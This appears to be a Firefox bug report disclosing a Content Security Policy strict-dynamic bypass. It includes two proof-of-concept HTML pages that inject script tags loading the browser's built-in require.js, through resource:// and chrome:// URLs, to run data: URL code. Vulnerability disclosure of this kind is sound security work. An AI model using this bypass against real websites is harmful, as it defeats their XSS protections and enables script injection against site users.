@@ -1,0 +1,60 @@
+User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Build ID: 20180122220231
+
+Steps to reproduce:
+
+The URLs located in `resource://devtools-client-jsonview/.*` bypass CSP. ( maybe intentionally )
+A `require.js` file is in the this directory and it can be used for CSP strict-dynamic bypass against any websites.
+
+Steps to reproduce:
+1. Go to attached PoC( csp_bypass_require.html ). This page has strict CSP rules:
+
+<meta http-equiv="Content-Security-Policy" content="default-src 'none';script-src 'nonce-random' 'strict-dynamic'">
+
+2. However, you can see `alert(1)`. It is executed from the following code:
+
+<script data-main='data:,alert(1)'></script>
+<script src="resource://devtools-client-jsonview/lib/require.js"></script>
+
+
+Actual results:
+
+CSP strict-dynamic is bypassed via browser resources.
+
+
+Expected results:
+
+CSP strict-dynamic should not be bypassed via browser resources.
+With attachment: csp_bypass_require.html
+<!DOCTYPE html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none';script-src 'nonce-random' 'strict-dynamic'">
+</head>
+<body>
+
+<!-- XSS start -->
+<script>alert(0)//This is blocked</script>
+<script data-main='data:,alert(1)'></script>
+<script src="resource://devtools-client-jsonview/lib/require.js"></script>
+<!-- XSS end -->
+
+</body>
+</html>
+
+With attachment: csp_bypass_require_chromeurl.html
+<!DOCTYPE html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none';script-src 'nonce-random' 'strict-dynamic'">
+</head>
+<body>
+
+<!-- XSS start -->
+<script>alert(0)//This is blocked</script>
+<script data-main='data:,alert(1)'></script>
+<script src="chrome://browser/content//chrome/devtools/modules/devtools/client/jsonview/lib/require.js"></script>
+<!-- XSS end -->
+
+</body>
+</html>
